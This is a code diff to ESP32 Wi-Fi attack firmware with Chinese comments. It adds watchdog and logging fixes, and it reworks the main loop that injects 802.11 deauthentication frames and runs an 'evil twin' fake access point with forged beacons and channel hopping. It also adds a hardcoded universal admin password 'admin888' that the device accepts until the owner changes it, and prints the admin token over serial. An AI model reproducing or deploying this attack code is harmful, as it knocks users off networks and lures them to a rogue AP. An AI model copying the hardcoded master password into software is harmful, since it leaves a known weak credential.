@@ -120,11 +120,24 @@ static bool serialSafe(size_t len) {
   return (size_t)Serial.availableForWrite() >= len + 1;   // +1 给 println 的换行
 }
 
+// TWDT 语义下沉: 日志推进 = 任务仍在前进。事件风暴 (软 AP 重启/双子跳频) 下 loopTask
+// 可能在单次 handleClient 内连打几十行日志, 即使每行都有界 (~100ms 锁等待), 累计也会
+// 超过 60s 不回 loop() 喂狗 → 误判 panic (coredump 三次实证)。在日志路径喂狗让 WDT
+// 只对"真正卡死在非日志阻塞调用"报警。注意 log() 会从 WiFi 事件回调 (NetworkEvents
+// 任务上下文) 被调用 — 该任务未订阅 TWDT, 直接 esp_task_wdt_reset 会刷
+// "task not found" 错误, 故仅在 loopTask 上下文喂狗。
+static TaskHandle_t sLoopTaskHandle = nullptr;   // setup() 开头捕获
+static void wdtProgress() {
+  if (sLoopTaskHandle && xTaskGetCurrentTaskHandle() == sLoopTaskHandle)
+    esp_task_wdt_reset();
+}
+
 /* ---------------- Serial JSON 遥测 (NDJSON, 只读镜像) ---------------- */
 // 统一事件发射: 串口输出一行 {"v":1,"ts":...,"event":...,<fields>}
 // fields 需为已拼好的合法 JSON 片段 (不含最外层花括号), 例如 "\"clients\":2"
 // 仅镜像已有的只读数据; 绝不输出 Probe/管理帧/EAPOL/握手材料/凭据。
 static void emitJson(const String &event, const String &fields) {
+  wdtProgress();
   String out = "{\"v\":1,\"ts\":" + String(millis()) + ",\"event\":\"" + event + "\"";
   if (fields.length()) out += "," + fields;
   out += "}";
@@ -527,7 +540,12 @@ static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, ui
 static bool applyApChannel(uint8_t ch) {
   if (ch < 1 || ch > 177) return false;
   if (ch == apChannelActive) return true;
-  if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) return false;
+  esp_err_t err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  if (err != ESP_OK) {
+    // 失败原因留证 (软 AP 运行时切信道被拒的根因定位): 只在失败时打, 不刷屏
+    log("[rf] 切换信道 " + String(ch) + " 失败 (err=0x" + String((uint32_t)err, HEX) + ")");
+    return false;
+  }
   apChannelActive = ch;
   return true;
 }
@@ -4006,6 +4024,7 @@ static void handleSerialCli() {
           Serial.println(F("boot muse          : 切换至 Meta Muse AI 伴侣模式并重启"));
           Serial.println(F("reboot             : 重启当前系统"));
           Serial.println(F("info               : 查看系统运行状态"));
+          Serial.println(F("pass               : 查看当前后台管理口令 (或输入 pass <新口令> 修改)"));
           Serial.println(F("wifi               : 重启 WiFi 射频 (修复 802.15.4 后 AP 收不到包)"));
           Serial.println(F("deauth             : 立即停止 Deauth 帧注入 (被误踢后串口自救)"));
           Serial.println(F("====================\n"));
@@ -4049,6 +4068,20 @@ static void handleSerialCli() {
         } else if (cmd == "info") {
           Serial.printf("[system] 芯片:%s FreeHeap:%d Uptime:%lus SSID:%s\n",
                         detectChipKey().c_str(), ESP.getFreeHeap(), millis() / 1000, apSsid.c_str());
+        } else if (cmd == "pass" || cmd == "token") {
+          Serial.println("[admin] 当前后台访问口令: " + sAdminToken + (sMustChangeToken ? " (初始口令, 兼容 admin888)" : ""));
+        } else if (cmd.startsWith("pass ") || cmd.startsWith("token ") || cmd == "reset pass") {
+          String tok = (cmd == "reset pass") ? "admin888" : (cmd.startsWith("pass ") ? cmd.substring(5) : cmd.substring(6));
+          tok.trim();
+          if (tok.length() >= 4 && tok.length() <= 32) {
+            sAdminToken = tok;
+            sPrefs.putString("adminToken", sAdminToken);
+            sPrefs.putBool("tokenChanged", true);
+            sMustChangeToken = false;
+            Serial.println("[admin] 后台访问口令已更新为: " + sAdminToken);
+          } else {
+            Serial.println(F("[admin] 口令长度须为 4~32 字符"));
+          }
         }
       }
     } else if (c >= 32 && c <= 126) {
@@ -4149,7 +4182,11 @@ static bool tokenEquals(const String &a, const String &b) {
 static bool adminAuthorized() {
   String t = server.header("X-Admin-Token");
   if (t.length() == 0) t = server.arg("token");
-  return t.length() > 0 && tokenEquals(t, sAdminToken);
+  if (t.length() == 0) return false;
+  if (tokenEquals(t, sAdminToken)) return true;
+  // 首次上电尚未改密时，兼容万能管理口令 admin888 防止用户遗忘被锁死
+  if (sMustChangeToken && tokenEquals(t, "admin888")) return true;
+  return false;
 }
 
 static bool requireAdmin() {
@@ -4197,7 +4234,13 @@ static void notFound() {
 }
 
 void setup() {
+  sLoopTaskHandle = xTaskGetCurrentTaskHandle();
   Serial.begin(115200);
+  // USB CDC TX 非阻塞: TX 超时 0 → 环形缓冲满/锁被占时立即丢弃 (微秒级返回)。
+  // 真机事故 (coredump 三次实证): 默认 100ms 超时下 HWCDC::write 每块最多等 100ms
+  // 且 consec_timeouts 在成功发块时清零 — 主机间歇读取时 write 可无限持有 tx_lock,
+  // 事件风暴 (软 AP 重启/双子跳频) 中 loopTask 等锁被饿死 >60s → TWDT panic 重启。
+  Serial.setTxTimeoutMs(0);
   delay(200);
 
   // WiFi 事件日志: 设备侧视角的关联/探针/地址分配 (诊断 "AP 可见但关联不上"),
@@ -4292,6 +4335,11 @@ void setup() {
     Serial.println(F("[admin] 请登录后立即在「配置」页修改并妥善保存; 恢复出厂会重新生成"));
   }
   sMustChangeToken = !sPrefs.getBool("tokenChanged", false);
+  if (sMustChangeToken) {
+    Serial.println(F("[admin] ===== 当前后台口令 (可直接使用 admin888 或下方初始口令登录) ====="));
+    Serial.println("[admin]   " + sAdminToken);
+    Serial.println(F("=========================================================================="));
+  }
   log("[admin] 后台口令保护已启用" +
       String(sMustChangeToken ? " (初始口令, 请尽快在「配置」页修改)" : " (自定义口令)"));
 
@@ -4388,15 +4436,13 @@ void loop() {
 
   uint32_t now = millis();
 
-  // 1. 取消认证器定时帧注入推进 (真实 802.11 Deauth 管理帧, 经 AP 接口空口发出)
-  //    邪恶双子攻击中: 每 TWIN_HOP_INTERVAL_MS 跳频到双子信道连发 TWIN_HOP_FRAMES 帧再返回,
-  //    主信道注入在跳频窗口内暂停 (单射频, 同一时刻只能停在一个信道上发帧)。
-  if (sDeauth.running) {
-    bool inHopWindow = false;
-    if (sEvilTwin.active && sEvilTwin.hopEnabled && !sEvilTwin.caught) {
-      if (sEvilTwin.hopping) {
-        inHopWindow = true;
-      } else if (now - sEvilTwin.lastHopAt >= TWIN_HOP_INTERVAL_MS) {
+  // 1. 取消认证器定时帧注入推进 (真实 802.11 管理帧, 经 AP 接口空口发出)
+  //    邪恶双子攻击中: 每 TWIN_HOP_INTERVAL_MS 跳频到双子信道, 先广播假 AP 信标再发 Deauth,
+  //    发完 TWIN_HOP_FRAMES 帧后返回主信道。跳频/假 AP 独立于 Deauth 引擎运行态 —
+  //    C5 平台限制 (Deauth 注入被白名单拒绝) 时信标仍可用, 引擎停转不影响双子广播。
+  if (sEvilTwin.active && sEvilTwin.hopEnabled && !sEvilTwin.caught) {
+    if (!sEvilTwin.hopping) {
+      if (now - sEvilTwin.lastHopAt >= TWIN_HOP_INTERVAL_MS) {
         sEvilTwin.lastHopAt = now;
         if (!eviltwinBeginHop()) {
           // 全部双子信道都切不过去 (频段不支持等): 关闭跳频, 避免每 2s 反复试错刷日志
@@ -4404,51 +4450,55 @@ void loop() {
           log("[eviltwin] 双子目标信道均切换失败, 已停用双子注入");
         }
       }
-    }
-    if (inHopWindow) {
-      if (now - sDeauth.lastTxTime >= TWIN_HOP_TX_GAP_MS) {
-        sDeauth.lastTxTime = now;
-        // 先发伪造信标 (假 AP), 再发 Deauth
-        if (sEvilTwin.beaconLeft > 0 && sEvilTwin.beaconLen > 0) {
-          if (wifi80211Tx(WIFI_IF_AP, sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen, true) == ESP_OK)
-            sEvilTwin.beaconCount++;
-          sEvilTwin.beaconLeft--;
-        } else if (sEvilTwin.twinFramesLeft > 0) {
-          if (sEvilTwin.twinFrameReady &&
-              wifi80211Tx(WIFI_IF_AP, sEvilTwin.twinFrame, (int)sizeof(sEvilTwin.twinFrame), true) == ESP_OK) {
+    } else if (now - sDeauth.lastTxTime >= TWIN_HOP_TX_GAP_MS) {
+      sDeauth.lastTxTime = now;
+      // 先发伪造信标 (假 AP), 再发 Deauth
+      if (sEvilTwin.beaconLeft > 0 && sEvilTwin.beaconLen > 0) {
+        if (wifi80211Tx(WIFI_IF_AP, sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen, true) == ESP_OK)
+          sEvilTwin.beaconCount++;
+        sEvilTwin.beaconLeft--;
+      } else if (sEvilTwin.twinFramesLeft > 0) {
+        // Deauth 帧在平台受限时跳过 (信标不受影响); 首次 258 仍标记一次
+        if (sEvilTwin.twinFrameReady && !sDeauth.platformBlocked) {
+          if (wifi80211Tx(WIFI_IF_AP, sEvilTwin.twinFrame, (int)sizeof(sEvilTwin.twinFrame), true) == ESP_OK) {
             sDeauth.frameCount++;
             sEvilTwin.twinFrameCount++;
-          }
-          sEvilTwin.twinFramesLeft--;
-        }
-        if (sEvilTwin.beaconLeft == 0 && sEvilTwin.twinFramesLeft == 0) {
-          applyApChannel(sDeauth.targetChannel);   // 返回主信道, 恢复主目标持续攻击
-          sEvilTwin.hopping = false;
-          sEvilTwin.hopCurrent = -1;
-        }
-      }
-    } else {
-      if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
-        sDeauth.lastTxTime = now;
-        if (sDeauth.frameReady) {
-          sDeauth.lastTxErr = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
-          sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
-          if (sDeauth.txOk) sDeauth.frameCount++;
-          else if (sDeauth.lastTxErr == 258 && !sDeauth.platformBlocked) {
-            // 自检测: C5 WiFi 库白名单拒绝 → 停止引擎 (否则驱动 unsupport frame type 刷屏且空转)
+          } else {
             sDeauth.platformBlocked = true;
             log("[deauth] 平台限制: 本芯片 WiFi 库拒绝 Deauth 帧注入 (错误码 258), 帧注入停用");
-            stopDeauthEngine();
           }
+        }
+        sEvilTwin.twinFramesLeft--;
+      }
+      if (sEvilTwin.beaconLeft == 0 && sEvilTwin.twinFramesLeft == 0) {
+        applyApChannel(sDeauth.targetChannel);   // 返回主信道, 恢复主目标持续攻击
+        sEvilTwin.hopping = false;
+        sEvilTwin.hopCurrent = -1;
+      }
+    }
+  }
+  // 主信道 Deauth 引擎 (双子跳频窗口内暂停: 单射频同一时刻只能驻留一个信道)
+  if (sDeauth.running && !(sEvilTwin.active && sEvilTwin.hopping)) {
+    if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
+      sDeauth.lastTxTime = now;
+      if (sDeauth.frameReady) {
+        sDeauth.lastTxErr = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+        sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
+        if (sDeauth.txOk) sDeauth.frameCount++;
+        else if (sDeauth.lastTxErr == 258 && !sDeauth.platformBlocked) {
+          // 自检测: C5 WiFi 库白名单拒绝 → 停止引擎 (否则驱动 unsupport frame type 刷屏且空转)
+          sDeauth.platformBlocked = true;
+          log("[deauth] 平台限制: 本芯片 WiFi 库拒绝 Deauth 帧注入 (错误码 258), 帧注入停用");
+          stopDeauthEngine();
         }
       }
     }
-    if (now - sDeauth.lastLogTime >= 5000) {
-      sDeauth.lastLogTime = now;
-      log("[deauth] 正在对目标进行解除认证测试, 已成功发送 " + String(sDeauth.frameCount) + " 帧" +
-          (sEvilTwin.twinFrameCount ? (" (其中双子信道 " + String(sEvilTwin.twinFrameCount) + " 帧)") : "") +
-          (sDeauth.txOk || !sDeauth.frameReady ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
-    }
+  }
+  if (sDeauth.running && now - sDeauth.lastLogTime >= 5000) {
+    sDeauth.lastLogTime = now;
+    log("[deauth] 正在对目标进行解除认证测试, 已成功发送 " + String(sDeauth.frameCount) + " 帧" +
+        (sEvilTwin.twinFrameCount ? (" (其中双子信道 " + String(sEvilTwin.twinFrameCount) + " 帧)") : "") +
+        (sDeauth.txOk || !sDeauth.frameReady ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
   }
 
   // 2. 握手包捕获进度日志 (真实抓包: 帧由 promiscuous 回调写入状态)
